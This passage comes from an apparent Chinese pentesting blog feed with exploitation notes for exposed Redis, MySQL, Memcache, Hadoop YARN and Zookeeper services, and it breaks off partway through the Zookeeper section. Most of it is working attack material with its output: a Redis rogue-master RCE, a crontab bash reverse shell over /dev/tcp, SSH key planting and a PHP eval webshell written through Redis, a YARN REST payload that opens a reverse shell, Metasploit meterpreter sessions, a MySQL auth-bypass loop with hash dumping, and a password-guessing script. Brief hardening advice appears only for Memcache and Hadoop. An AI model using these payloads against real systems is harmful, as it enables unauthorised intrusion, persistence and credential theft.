        <content type="html"><![CDATA[<p>REmote DIctionary Server(Redis) 是一个开源的Key-Value数据存储系统，使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型，并提供多种语言的API。</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><pre><code class="zsh">sudo nmap -sV -Pn -T4 -sSU -p 6379,26379 -sC    192.168.79.207                                                   Host is up (0.00014s latency).PORT      STATE  SERVICE VERSION6379/tcp  open   redis   Redis key-value store 4.0.1426379/tcp closed unknown6379/udp  closed unknown26379/udp closed unknownNmap done: 1 IP address (1 host up) scanned in 6.53 seconds</code></pre><h2 id="Redis未授权访问"><a href="#Redis未授权访问" class="headerlink" title="Redis未授权访问"></a>Redis未授权访问</h2><p>（1）redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网；<br>（2）没有设置密码认证（一般为空），可以免密码远程登录redis服务。 </p><h3 id="redis-rogue-getshell复现"><a href="#redis-rogue-getshell复现" class="headerlink" title="redis-rogue-getshell复现"></a><a href="https://github.com/vulhub/redis-rogue-getshell">redis-rogue-getshell</a>复现</h3><pre><code class="zsh">./redis-master.py  -r 192.168.79.207 -p 6379 -L 10.211.55.13 -P 4444 -f RedisModulesSDK/exp.so  -c &quot;id&quot;&gt;&gt; send data: b&#39;*3\r\n$7\r\nSLAVEOF\r\n$12\r\n10.211.55.13\r\n$4\r\n4444\r\n&#39;&gt;&gt; receive data: b&#39;+OK\r\n&#39;&gt;&gt; send data: b&#39;*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$6\r\nexp.so\r\n&#39;&gt;&gt; receive data: b&#39;+OK\r\n&#39;&gt;&gt; receive data: b&#39;PING\r\n&#39;&gt;&gt; receive data: b&#39;REPLCONF listening-port 6379\r\n&#39;&gt;&gt; receive data: b&#39;REPLCONF capa eof capa psync2\r\n&#39;&gt;&gt; receive data: b&#39;PSYNC 971afdf273239115adec6f02cc8f8b85a90c25bd 1\r\n&#39;&gt;&gt; send data: b&#39;*3\r\n$6\r\nMODULE\r\n$4\r\nLOAD\r\n$8\r\n./exp.so\r\n&#39;&gt;&gt; receive data: b&#39;+OK\r\n&#39;&gt;&gt; send data: b&#39;*3\r\n$7\r\nSLAVEOF\r\n$2\r\nNO\r\n$3\r\nONE\r\n&#39;&gt;&gt; receive data: b&#39;+OK\r\n&#39;&gt;&gt; send data: b&#39;*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$8\r\ndump.rdb\r\n&#39;&gt;&gt; receive data: b&#39;+OK\r\n&#39;&gt;&gt; send data: b&#39;*2\r\n$11\r\nsystem.exec\r\n$2\r\nid\r\n&#39;&gt;&gt; receive data: b&#39;$49\r\neuid=999(redis) gid=999(redis) groups=999(redis)\n\r\n&#39;euid=999(redis) gid=999(redis) groups=999(redis)&gt;&gt; send data: b&#39;*3\r\n$6\r\nMODULE\r\n$6\r\nUNLOAD\r\n$6\r\nsystem\r\n&#39;&gt;&gt; receive data: b&#39;+OK\r\n&#39;</code></pre><h3 id="MSF相关模块"><a href="#MSF相关模块" class="headerlink" title="MSF相关模块"></a>MSF相关模块</h3><blockquote><p>scanner/redis/redis_server</p></blockquote><pre><code class="zsh">msf6 auxiliary(scanner/redis/redis_server) &gt; optionsModule options (auxiliary/scanner/redis/redis_server):   Name      Current Setting  Required  Description   ----      ---------------  --------  -----------   COMMAND   INFO             yes       The Redis command to run   PASSWORD  foobared         no        Redis password for authentication test   RHOSTS    192.168.79.207   yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;   RPORT     6379             yes       The target port (TCP)   THREADS   1                yes       The number of concurrent threads (max one per host)msf6 auxiliary(scanner/redis/redis_server) &gt; run[+] 192.168.79.207:6379   - Found redis with INFO command: $2701\x0d\x0a# Server\x0d\x0aredis_version:4.0.14\x0d\x0aredis_git_sha1:00000000\x0d\x0aredis_git_dirty:0\x0d\x0aredis_build_id:3914f9509eb3b682\x0d\x0aredis_mode:standalone\x0d\x0aos:Linux 5.4.39-linuxkit x86_64\x0d\x0aarch_bits:64\x0d\x0amultiplexing_api:epoll\x0d\x0aatomicvar_api:atomic-builtin\x0d\x0agcc_version:6.3.0\x0d\x0aprocess_id:1\x0d\x0arun_id:dffdc0223004bf2ccbcb29dd56d35a30c9645059\x0d\x0atcp_port:6379\x0d\x0auptime_in_seconds:1612\x0d\x0auptime_in_days:0\x0d\x0ahz:10\x0d\x0alru_clock:13240592\x0d\x0aexecutable:/data/redis-server\x0d\x0aconfig_file:\x0d\x0a\x0d\x0a# Clients\x0d\x0aconnected_clients:1\x0d\x0aclient_longest_output_list:0\x0d\x0aclient_biggest_input_buf:0\x0d\x0ablocked_clients:0\x0d\x0a\x0d\x0a# Memory\x0d\x0aused_memory:849288\x0d\x0aused_memory_human:829.38K\x0d\x0aused_memory_rss:4186112\x0d\x0aused_memory_rss_human:3.99M\x0d\x0aused_memory_peak:869304\x0d\x0aused_memory_peak_human:848.93K\x0d\x0aused_memory_peak_perc:97.70%\x0d\x0aused_memory_overhead:836126\x0d\x0aused_memory_startup:786488\x0d\x0aused_memory_dataset:13162\x0d\x0aused_memory_dataset_perc:20.96%\x0d\x0atotal_system_memory:2083606528\x0d\x0atotal_system_memory_human:1.94G\x0d\x0aused_memory_lua:37888\x0d\x0aused_memory_lua_human:37.00K\x0d\x0amaxmemory:0\x0d\x0amaxmemory_human:0B\x0d\x0amaxmemory_policy:noeviction\x0d\x0amem_fragmentation_ratio:4.93\x0d\x0amem_allocator:jemalloc-4.0.3\x0d\x0aactive_defrag_running:0\x0d\x0alazyfree_pending_objects:0\x0d\x0a\x0d\x0a# CPU\x0d\x0aused_cpu_sys:2.00\x0d\x0aused_cpu_user:0.80\x0d\x0aused_cpu_sys_children:0.09\x0d\x0aused_cpu_user_children:0.00\x0d\x0a\x0d\x0a# Cluster\x0d\x0acluster_enabled:0\x0d\x0a\x0d\x0a# Keyspace[*] 192.168.79.207:6379   - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed</code></pre><blockquote><p>linux/redis/redis_replication_cmd_exec</p></blockquote><pre><code class="zsh">msf6 exploit(linux/redis/redis_replication_cmd_exec) &gt; optionsModule options (exploit/linux/redis/redis_replication_cmd_exec):   Name      Current Setting  Required  Description   ----      ---------------  --------  -----------   CUSTOM    true             yes       Whether compile payload file during exploiting   PASSWORD  foobared         no        Redis password for authentication test   RHOSTS    192.168.79.207   yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;   RPORT     6379             yes       The target port (TCP)   SRVHOST   10.211.55.13     yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.   SRVPORT   6379             yes       The local port to listen on.Payload options (linux/x64/meterpreter/reverse_tcp):   Name   Current Setting  Required  Description   ----   ---------------  --------  -----------   LHOST  10.211.55.13     yes       The listen address (an interface may be specified)   LPORT  4444             yes       The listen portmsf6 exploit(linux/redis/redis_replication_cmd_exec) &gt; run[*] Started reverse TCP handler on 10.211.55.13:4444[*] 192.168.79.207:6379   - Compile redis module extension file[+] 192.168.79.207:6379   - Payload generated successfully![*] 192.168.79.207:6379   - Listening on 10.211.55.13:6379[*] 192.168.79.207:6379   - Rogue server close...[*] 192.168.79.207:6379   - Sending command to trigger payload.[*] Sending stage (3008420 bytes) to 10.211.55.2[*] Meterpreter session 1 opened (10.211.55.13:4444 -&gt; 10.211.55.2:59293) at 2020-12-04 04:56:34 -0500[!] 192.168.79.207:6379   - This exploit may require manual cleanup of &#39;./wjkka.so&#39; on the targetmeterpreter &gt;</code></pre><h3 id="利用ssh公钥登陆Redis服务器"><a href="#利用ssh公钥登陆Redis服务器" class="headerlink" title="利用ssh公钥登陆Redis服务器"></a>利用ssh公钥登陆Redis服务器</h3><h4 id="在本地生成公私钥文件"><a href="#在本地生成公私钥文件" class="headerlink" title="在本地生成公私钥文件"></a>在本地生成公私钥文件</h4><pre><code class="zsh">ssh-keygen -t rsa</code></pre><h4 id="将公钥写入foo-txt文件"><a href="#将公钥写入foo-txt文件" class="headerlink" title="将公钥写入foo.txt文件"></a>将公钥写入foo.txt文件</h4><pre><code class="zsh">(echo -e &quot;&quot;; cat /root/.ssh/id_rsa.pub; echo -e &quot;&quot;) &gt; foo.txt</code></pre><h4 id="将公钥写入redis服务器"><a href="#将公钥写入redis服务器" class="headerlink" title="将公钥写入redis服务器"></a>将公钥写入redis服务器</h4><pre><code class="zsh">$ cat foo.txt | redis-cli -h 192.168.1.11 -x set crackit$ redis-cli -h 192.168.1.11$ 192.168.1.11:6379&gt; config set dir /root/.ssh/OK$ 192.168.1.11:6379&gt; config get dir1) &quot;dir&quot;2) &quot;/root/.ssh&quot;$ 192.168.1.11:6379&gt; config set dbfilename &quot;authorized_keys&quot;OK$ 192.168.1.11:6379&gt; saveOK</code></pre><h4 id="登陆Redis服务器"><a href="#登陆Redis服务器" class="headerlink" title="登陆Redis服务器"></a>登陆Redis服务器</h4><pre><code class="zsh">ssh -i id_rsa root@192.168.1.11</code></pre><h3 id="利用crontab反弹shell"><a href="#利用crontab反弹shell" class="headerlink" title="利用crontab反弹shell"></a>利用crontab反弹shell</h3><pre><code class="bash">redis-cli -h 192.168.0.104set xxx &quot;*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.0.104/4444 0&gt;&amp;1&quot;config set dir /var/spool/cronconfig set dbfilename rootsave</code></pre><h3 id="利用Redis写入webshell"><a href="#利用Redis写入webshell" class="headerlink" title="利用Redis写入webshell"></a>利用Redis写入webshell</h3><h4 id="生成webshell-php脚本"><a href="#生成webshell-php脚本" class="headerlink" title="生成webshell.php脚本"></a>生成webshell.php脚本</h4><pre><code class="zsh">&lt;?php set_time_limit(0);$fp=fopen(&#39;bmjoker.php&#39;,&#39;w&#39;);fwrite($fp,&#39;&lt;?php @eval($_POST[&quot;pass&quot;]);?&gt;&#39;);exit();?&gt;</code></pre><h4 id="将webshell-php前后空2行"><a href="#将webshell-php前后空2行" class="headerlink" title="将webshell.php前后空2行"></a>将webshell.php前后空2行</h4><pre><code class="zsh">( echo -e &quot;&quot;; cat webshell.php ; echo -e &quot;&quot;) &gt; webshell.txt </code></pre><h4 id="将webshell文件写入redis服务器中"><a href="#将webshell文件写入redis服务器中" class="headerlink" title="将webshell文件写入redis服务器中"></a>将webshell文件写入redis服务器中</h4><pre><code class="zsh">$ cat webshell.txt | redis-cli -h 192.168.1.11 -x set crackit$ redis-cli -h 192.168.1.11$ 192.168.1.11:6379&gt; config set dir /var/www/html/OK$ 192.168.1.11:6379&gt; config get dir1) &quot;dir&quot;2) &quot;/var/www/html/&quot;$ 192.168.1.11:6379&gt; config set dbfilename &quot;webshell.php&quot;OK$ 192.168.1.11:6379&gt; saveOK</code></pre><p>使用behind/antsword等客户端连接</p><h2 id="测试是否存在未授权或弱口令的小脚本"><a href="#测试是否存在未授权或弱口令的小脚本" class="headerlink" title="测试是否存在未授权或弱口令的小脚本"></a>测试是否存在未授权或弱口令的小脚本</h2><pre><code class="python">#! /usr/bin/env python# _*_  coding:utf-8 _*_import socketimport sysPASSWORD_DIC=[&#39;redis&#39;,&#39;root&#39;,&#39;oracle&#39;,&#39;password&#39;,&#39;p@aaw0rd&#39;,&#39;abc123!&#39;,&#39;123456&#39;,&#39;admin&#39;]def check(ip, port, timeout):    try:        socket.setdefaulttimeout(timeout)        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        s.connect((ip, int(port)))        s.send(&quot;INFO&quot;)        result = s.recv(1024)        if &quot;redis_version&quot; in result:            return u&quot;未授权访问&quot;        elif &quot;Authentication&quot; in result:            for pass_ in PASSWORD_DIC:                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)                s.connect((ip, int(port)))                s.send(&quot;AUTH %s&quot; %(pass_))                result = s.recv(1024)                if &#39;+OK&#39; in result:                    return u&quot;存在弱口令，密码：%s&quot; % (pass_)    except Exception, e:        passif __name__ == &#39;__main__&#39;:    ip=sys.argv[1]    port=sys.argv[2]    print check(ip,port, timeout=10)</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
          <category> Exploit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>MySQL</title>
      <link href="Kali/Exploit/MySQL.html"/>
      <url>Kali/Exploit/MySQL.html</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><pre><code class="zsh">sudo nmap -sV -Pn -T4 -sSU -p 3306 -sC    192.168.79.207                                                           Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-04 18:28 CSTNmap scan report for 192.168.79.207Host is up (0.00013s latency).PORT     STATE  SERVICE VERSION3306/tcp open   mysql   MySQL 5.5.23| mysql-info:|   Protocol: 10|   Version: 5.5.23|   Thread ID: 2|   Capabilities flags: 63487|   Some Capabilities: LongColumnFlag, Support41Auth, Speaks41ProtocolOld, SupportsTransactions, InteractiveClient, SupportsCompression, LongPassword, SupportsLoadDataLocal, ODBCClient, ConnectWithDatabase, DontAllowDatabaseTableColumn, IgnoreSigpipes, FoundRows, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults|   Status: Autocommit|   Salt: &lt;~&#39;EdI|Z*b0d,Ly&gt;hpy2|_  Auth Plugin Name: mysql_native_password3306/udp closed mysqlNmap done: 1 IP address (1 host up) scanned in 0.45 seconds</code></pre><h2 id="MySQL认证绕过漏洞-CVE-2012-2122"><a href="#MySQL认证绕过漏洞-CVE-2012-2122" class="headerlink" title="MySQL认证绕过漏洞 CVE-2012-2122"></a>MySQL认证绕过漏洞 CVE-2012-2122</h2><p>  当连接MariaDB/MySQL时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是memcmp()返回一个非零值，也会使MySQL认为两个密码是相同的。<br>也就是说只要知道用户名，不断尝试就能够直接登入SQL数据库。</p><h3 id="bash脚本利用"><a href="#bash脚本利用" class="headerlink" title="bash脚本利用"></a>bash脚本利用</h3><blockquote><p>在不知道我们环境正确密码的情况下，在bash下运行如下命令，在一定数量尝试后便可成功登录</p></blockquote><pre><code> for i in `seq 1 1000`; do mysql -u root --password=bad -h 127.0.0.1 2&gt;/dev/null; done  Welcome to the MySQL monitor.  Commands end with ; or \g.Your MySQL connection id is 603Server version: 5.5.23 Source distributionType &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.mysql&gt; </code></pre><h2 id="MSF利用"><a href="#MSF利用" class="headerlink" title="MSF利用"></a>MSF利用</h2><blockquote><p>mysql_authbypass_hashdump</p></blockquote><pre><code>$ msfconsolemsf &gt; use auxiliary/scanner/mysql/mysql_authbypass_hashdumpmsf  auxiliary(mysql_authbypass_hashdump) &gt; set USERNAME rootmsf  auxiliary(mysql_authbypass_hashdump) &gt; set RHOSTS 127.0.0.1msf  auxiliary(mysql_authbypass_hashdump) &gt; run[+] 127.0.0.1:3306 The server allows logins, proceeding with bypass test[*] 127.0.0.1:3306 Authentication bypass is 10% complete[*] 127.0.0.1:3306 Authentication bypass is 20% complete[*] 127.0.0.1:3306 Successfully bypassed authentication after 205 attempts[+] 127.0.0.1:3306 Successful exploited the authentication bypass flaw, dumping hashes...[+] 127.0.0.1:3306 Saving HashString as Loot: root:*C8998584D8AA12421F29BB41132A288CD6829A6D[+] 127.0.0.1:3306 Saving HashString as Loot: root:*C8998584D8AA12421F29BB41132A288CD6829A6D[+] 127.0.0.1:3306 Saving HashString as Loot: root:*C8998584D8AA12421F29BB41132A288CD6829A6D[+] 127.0.0.1:3306 Saving HashString as Loot: root:*C8998584D8AA12421F29BB41132A288CD6829A6D[+] 127.0.0.1:3306 Saving HashString as Loot: debian-sys-maint:*C59FFB311C358B4EFD4F0B82D9A03CBD77DC7C89[*] 127.0.0.1:3306 Hash Table has been saved: 20120611013537_default_127.0.0.1_mysql.hashes_889573.txt[*] Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
          <category> Exploit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Memcache</title>
      <link href="Kali/Exploit/Memcache.html"/>
      <url>Kali/Exploit/Memcache.html</url>
      
        <content type="html"><![CDATA[<p>memcached是一套分布式的高速缓存系统。<br>它以Key-Value（键值对）形式将数据存储在内存中，这些数据通常是应用读取频繁的。正因为内存中数据的读取远远大于硬盘，因此可以用来加速应用的访问。</p><p>由于memcached安全设计缺陷，客户端连接memcached服务器后无需认证就可读取、修改服务器缓存内容。</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><pre><code class="zsh">sudo nmap -Pn -T4 -sV -p 11211  --script memcached-info 10.198.18.1Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-27 15:39 CSTNmap scan report for 10.198.18.1Host is up (0.11s latency).PORT      STATE SERVICE   VERSION11211/tcp open  memcached Memcached 1.5.12 (uptime 363416 seconds)| memcached-info:|   Process ID: 268842|   Uptime: 363417 seconds|   Server time: 2020-11-27T07:39:06|   Architecture: 64 bit|   Used CPU (user): 245.883293|   Used CPU (system): 676.125332|   Current connections: 2057|   Total connections: 786483|   Maximum connections: 65535|   TCP Port: 11211|   UDP Port: 0|_  Authentication: noService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 6.96 seconds</code></pre><h2 id="Memcache数据库未授权访问"><a href="#Memcache数据库未授权访问" class="headerlink" title="Memcache数据库未授权访问"></a>Memcache数据库未授权访问</h2><blockquote><p>登录机器执行<code>netstat -an |more</code>命令查看端口监听情况。回显0.0.0.0:11211表示在所有网卡进行监听，存在memcached未授权访问漏洞。</p></blockquote><h3 id="telnet-nc-netstat验证"><a href="#telnet-nc-netstat验证" class="headerlink" title="telnet/nc/netstat验证"></a>telnet/nc/netstat验证</h3><pre><code class="zsh">telnet 10.198.18.1 11211stats # 查看memcache 服务状态 stats items # 查看所有items stats cachedump 32 0 # 获得缓存key get :state:264861539228401373:261588 # 通过key读取相应value ，获得实际缓存内容，造成敏感信息泄露crtl+] q   # 退出telnetnc -vv 10.198.18.1 11211</code></pre><h3 id="MSF相关模块"><a href="#MSF相关模块" class="headerlink" title="MSF相关模块"></a>MSF相关模块</h3><h4 id="memcached键值提取器"><a href="#memcached键值提取器" class="headerlink" title="memcached键值提取器"></a>memcached键值提取器</h4><pre><code class="zsh">msf6 auxiliary(gather/memcached_extractor) &gt; show info       Name: Memcached Extractor     Module: auxiliary/gather/memcached_extractor    License: Metasploit Framework License (BSD)       Rank: NormalProvided by:  Paul Deardorff &lt;paul_deardorff@rapid7.com&gt;Check supported:  NoBasic options:  Name     Current Setting  Required  Description  ----     ---------------  --------  -----------  RHOSTS   10.198.18.2      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;  RPORT    11211            yes       The target port (TCP)  THREADS  1                yes       The number of concurrent threads (max one per host)</code></pre><h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><ol><li>配置访问控制</li></ol><p>建立iptables规则，只允许某一ip对memcache的端口进行访问。</p><pre><code class="zsh">iptables -A INPUT -p tcp -s 192.168.0.2 —dport 11211 -j ACCEPT</code></pre><ol start="2"><li><p>绑定监听ip<br>memcache如果没有开在外网的必要，可以在memcache启动时绑定ip地址为127.0.0.1</p><pre><code class="zsh">memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P /tmp/memcached.pid</code></pre></li><li><p>使用普通账号运行，指定memcache用户运行</p></li><li><p>修改默认端口<br>修改默认11211监听端口为其他端口</p><pre><code class="zsh">memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11222 -c 1024 -P /tmp/memcached.pid</code></pre></li></ol><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
          <category> Exploit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hadoop</title>
      <link href="Kali/Exploit/Hadoop.html"/>
      <url>Kali/Exploit/Hadoop.html</url>
      
        <content type="html"><![CDATA[<p>Hadoop是一个Apache基金会所开发的分布式基础架构， 核心设计是<code>HDFS</code>（即分布式文件系统）和<code>MapReduce</code>， * HDFS 为海量数据提供存储 * MapReduce为海量数据提供计算</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><pre><code class="zsh">sudo nmap -sV -Pn -T4 -sSU -p 8088 -sC    192.168.79.207Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-04 18:32 CSTNmap scan report for 192.168.79.207Host is up (0.00012s latency).PORT     STATE  SERVICE    VERSION8088/tcp open   http       Jetty 6.1.26|_http-server-header: Jetty(6.1.26)| http-title:     All Applications|_Requested resource was http://192.168.79.207:8088/cluster8088/udp closed radan-httpNmap done: 1 IP address (1 host up) scanned in 6.81 seconds</code></pre><h2 id="Hadoop-Yarn（ResourceManager-REST-API-未授权漏洞"><a href="#Hadoop-Yarn（ResourceManager-REST-API-未授权漏洞" class="headerlink" title="Hadoop Yarn（ResourceManager REST API)未授权漏洞"></a>Hadoop Yarn（ResourceManager REST API)未授权漏洞</h2><p>YARN提供有默认开放在8088和8090的REST API（默认前者）允许用户直接通过API进行相关的应用创建、任务提交执行等操作，如果配置不当， 攻击者利用Hadoop Yarn资源管理系统REST API未授权漏洞对服务器进行远程执行代码。</p><h3 id="手工或BP测试"><a href="#手工或BP测试" class="headerlink" title="手工或BP测试"></a>手工或BP测试</h3><p>Payload</p><pre><code>POST /ws/v1/cluster/apps HTTP/1.1Host: 127.0.0.1:8088Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Content-Type: application/jsonContent-Length: 268&#123;   &quot;application-id&quot;:&quot;application_1604979684298_0006&quot;,    &quot;application-name&quot;:&quot;test&quot;,    &quot;application-type&quot;:&quot;YARN&quot;,    &quot;am-container-spec&quot;:&#123;        &quot;commands&quot;:&#123;            &quot;command&quot;:&quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.79.28/9999  0&gt;&amp;1&quot;        &#125;    &#125;&#125;</code></pre><p><img src="../images/hadoop-1.png" alt="hadoop-1"></p><ol><li> 申请新的application，记录<code>application-id</code>字段 直接通过curl进行POST请求</li></ol><pre><code>curl -v -X POST &#39;http://ip:8088/ws/v1/cluster/apps/new-application&#39;返回包含如下信息&#123;&quot;application-id&quot;:&quot;application_1527144634877_20465&quot;,&quot;maximum-resource-capability&quot;:&#123;&quot;memory&quot;:16384,&quot;vCores&quot;:8&#125;&#125;</code></pre><ol start="2"><li> 使用nc监听9999端口 <code>nc -lvvp 9999</code></li><li> 直接发送构造好的payload</li></ol><pre><code>curl -s -i -X POST -H &#39;Accept: application/json&#39; -H &#39;Content-Type: application/json&#39; http://ip:8088/ws/v1/cluster/apps --data-binary @1.json</code></pre><p>1.json文件中的内容</p><pre><code class="text">&#123;    &quot;am-container-spec&quot;:&#123;        &quot;commands&quot;:&#123;            &quot;command&quot;:&quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.79.28/9999  0&gt;&amp;1&quot;        &#125;    &#125;,    &quot;application-id&quot;:&quot;application_1527144634877_20465&quot;,    &quot;application-name&quot;:&quot;test&quot;,    &quot;application-type&quot;:&quot;YARN&quot;&#125;</code></pre><h3 id="MSF测试"><a href="#MSF测试" class="headerlink" title="MSF测试"></a>MSF测试</h3><pre><code>msf6 exploit(linux/http/hadoop_unauth_exec) &gt; show optionsModule options (exploit/linux/http/hadoop_unauth_exec):   Name     Current Setting  Required  Description   ----     ---------------  --------  -----------   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]   RHOSTS   127.0.0.1        yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;   RPORT    8088             yes       The target port (TCP)   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.   SRVPORT  8080             yes       The local port to listen on.   SSL      false            no        Negotiate SSL/TLS for outgoing connections   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)   URIPATH                   no        The URI to use for this exploit (default is random)   VHOST                     no        HTTP server virtual hostPayload options (linux/x64/meterpreter/reverse_tcp):   Name   Current Setting  Required  Description   ----   ---------------  --------  -----------   LHOST  192.168.79.28    yes       The listen address (an interface may be specified)   LPORT  4444             yes       The listen portExploit target:   Id  Name   --  ----   0   Automaticmsf6 exploit(linux/http/hadoop_unauth_exec) &gt; run[*] Started reverse TCP handler on 192.168.79.28:4444[*] Sending Command[*] Command Stager progress - 100.00% done (823/823 bytes)[*] Sending stage (3008420 bytes) to 192.168.79.28[*] Meterpreter session 2 opened (192.168.79.28:4444 -&gt; 192.168.79.28:63414) at 2020-11-10 15:44:07 +0800meterpreter &gt;</code></pre><h3 id="修复建议："><a href="#修复建议：" class="headerlink" title="修复建议："></a>修复建议：</h3><ul><li>如无必要，关闭Hadoop Web管理页面；</li><li>开启服务级别身份验证，如Kerberos认证；</li><li>部署Knox、Nginx之类的反向代理系统，防止未经授权用户访问；</li><li>限制可信任的IP地址才能访问Hadoop默认开放的多个端口</li></ul><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
          <category> Exploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> aa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Zookeeper</title>
      <link href="Kali/Exploit/Zookeeper.html"/>
      <url>Kali/Exploit/Zookeeper.html</url>
      
        <content type="html"><![CDATA[<p><code>Zookeeper</code>是一个分布式协调服务的开源框架，主要解决分布式集群中应用系统的一致性问题（避免同时操作同一数据造成脏读问题），本质上是一个<code>分布式的小文件存储系统</code>。</p><p>Zookeeper=<code>文件系统</code>+<code>监听通知机制</code></p><p>Zookeeper提供的常见服务：</p><ul><li><code>命令服务</code> 按名称标识集群中的节点，类似于DNS</li><li><code>配置管理</code> 加入节点的最近的和最新的系统配置信息</li><li><code>集群管理</code> 实时在集群和节点状态加入/离开节点</li><li><code>选举算法</code> 选举一个节点作为协调目的的leader</li><li><code>锁定和同步服务</code> 在修改数据的同时锁定数据</li><li><code>高度可靠的数据注册表</code> 即使在多个节点关闭时也可获得数据</li></ul><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><pre><code class="zsh">sudo nmap 10.196.20.52 -Pn -T4 -sS -p 2181Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-06 15:33 CSTNmap scan report for 10.196.20.52Host is up (0.13s latency).PORT     STATE SERVICE2181/tcp open  eforwardNmap done: 1 IP address (1 host up) scanned in 0.25 seconds</code></pre><h2 id="Zookeeper未授权访问-CVE-2014-085"><a href="#Zookeeper未授权访问-CVE-2014-085" class="headerlink" title="Zookeeper未授权访问 CVE-2014-085"></a>Zookeeper未授权访问 CVE-2014-085</h2><h3 id="获取服务信息"><a href="#获取服务信息" class="headerlink" title="获取服务信息"></a>获取服务信息</h3><ol><li>conf命令-获取配置信息<br><code>echo conf | nc 10.196.20.52 2181 </code></li><li>cons命令-获取会话详细信息<br> <code>echo cons | nc 10.196.20.52 2181 | more</code></li><li>dump命令-输出未处理的会话和leader节点<br> <code>echo dump | nc 10.196.20.52 2181 | 